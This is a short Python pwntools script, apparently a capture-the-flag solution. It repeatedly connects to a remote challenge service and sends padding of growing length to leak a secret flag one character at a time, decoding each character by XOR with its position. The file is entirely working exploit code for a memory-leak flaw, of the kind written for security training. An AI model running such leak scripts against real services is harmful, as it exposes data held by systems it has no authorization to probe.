from pwn import *

"""
dest[20:] -> flag
dest[:7] -> Hello,
we need (12+i) pad as user input [7,20)
then leak each char of flag (i)
xor with index in flag
"""

i = 0
flag = ""

while True:
    io = remote('141.85.224.99', '31337')
    io.sendline('A' * (i+12))
    io.recvline()

    c = io.recvline()
    flag += chr(ord(c[0]) ^ i)
    print("".join(flag))
    sleep(0.25)
    io.close()

    if flag[i] == '}':
        break

    i+= 1

print("".join(flag))
